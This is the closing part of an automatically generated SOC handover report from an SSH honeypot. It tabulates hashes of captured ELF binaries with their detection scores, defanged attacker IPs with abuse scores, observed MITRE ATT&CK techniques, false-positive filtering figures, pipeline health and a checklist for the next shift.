| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.96.195[.]17` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 2 |
| `138.68.29[.]8` | US | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `23.150.40[.]227` | US | Rozint | **100** ⚠️ | 5 |
| `66.132.172[.]192` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `45.173.103[.]146` | BR | EDILEUZA EVARISTO BARRETO | **100** ⚠️ | 3 |
| `161.35.217[.]121` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `183.201.208[.]25` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `180.252.151[.]254` | ID | PT TELKOM INDONESIA | **100** ⚠️ | 3 |
| `35.225.56[.]202` | US | Google LLC | **100** ⚠️ | 25 |
| `137.184.228[.]138` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 76 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 42 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 31 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |

---

## 🔕 False Positive Summary (85 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 27 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 27 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 169 cases |
| Tool 34  | Credential Extractor        | ✅ 75 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 85 filtered (50.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 42 priority case(s) shown individually · 17 recon entry/entries in table (5 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-24T23:01:04Z_
